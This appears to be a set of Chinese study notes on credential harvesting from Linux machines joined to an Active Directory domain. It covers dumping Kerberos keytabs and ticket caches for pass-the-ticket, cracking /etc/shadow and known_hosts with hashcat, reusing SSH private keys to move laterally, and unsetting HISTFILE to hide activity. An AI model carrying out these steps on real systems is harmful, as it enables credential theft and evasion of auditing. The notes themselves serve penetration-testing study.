老版本的linux还能[Telnet](https://en.wikipedia.org/wiki/Telnet)（23），需要账密连接

## **Linux computers credentials**

linux没有lsass process，但也有很多有意思的地方

### **Linux  Kerberos tickets**

为了认证用户身份，linux通常有一个配置了域计算机账户的Kerberos服务端，可以在keytab找到凭证，一般是在/etc/krb5.keytab，或者是 KRB5_KTNAME or KRB5_CLIENT_KTNAME环境变量中，或 [Kerberos configuration file](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/krb5_conf.html) /etc/krb5.conf 。可以用 klist 或 [cerbero](https://github.com/Zer1t0/cerbero)展示内容，包括密钥，klist找到nt hash 后可以[ask for a Kerberos ticket ](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)来伪装用户，

```sh
$ klist -k -Ke
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   1 r2d2@contoso.local (DEPRECATED:arcfour-hmac)  (0xc49a77fafad6d3a9270a8568fa453003)
```

域用户在计算机中进行身份认证时，将检索Kerberos凭证，可以那凭证伪造域用户，可以在 /tmp目录找带 krb5cc_%{[user UID](https://linuxhandbook.com/uid-linux/)}格式的文件。然而，凭证也可能存在[Linux kernel keys](https://man7.org/linux/man-pages/man7/keyrings.7.html)而不是文件中，用 [tickey](https://github.com/TarlogicSecurity/tickey)就可以转换成文件，有了ticket files就能实施 Pass the ticket attack。

```bash
$ ls /tmp/ | grep krb5cc
krb5cc_1000
krb5cc_1569901113
krb5cc_1569901115
```

找 [Kerberos configuration file](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/krb5_conf.html) in /etc/krb5.conf 可以确定 [where the tickets are stored](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) 

### **Linux user files**

 /etc/shadow（有本地用户密码）找凭证也行，然后试着[crack them by using hashcat](https://techglimpse.com/cracking-linux-password-hashes-with-hashcat/)，但不能用Pass-The-Hash attack，因为 [SSH](https://zer1t0.gitlab.io/posts/attacking_ad/#ssh)需要密码来远程授权登录

### **SSH keys**

找SSH私钥也行，在用户目录的.ssh下，文件名通常是id_rsa 或id_ed25519。

```bash
#Private key identification
$ file .ssh/id_ed25519
.ssh/id_ed25519: OpenSSH private key
```

如果私钥不需要passphrase（口令短语？） 来使用，你可以用它来连接域中另一台机器。

```bash
#Connecting to another machine with the SSH key.
$ ssh -i id_ed25519_foo_key foo@db.contoso.local
```

如果能在 .ssh目录下找到known_hosts，它可能会向你展示用私钥连接ssh到的机器主机名 ，文件名字可能会被hash，[crack them with hashcat](https://github.com/chris408/known_hosts-hashcat)

### **Bash history**

.bash_history在用户目录下，可以取消HISTFILE 环境变量（unset HISTFILE**）**设置来避免记录或用 [**similar**](https://www.if-not-true-then-false.com/2010/quit-bash-shell-without-saving-bash-history/) [**method**](https://www.cyberciti.biz/faq/disable-bash-shell-history-linux/)

```bash
###Disable bash history
unset HISTFILE
```

### **Other places to find credentials in Linux**

配置文件等

[LaZagne project ](https://github.com/AlessandroZ/LaZagne)有易泄露列表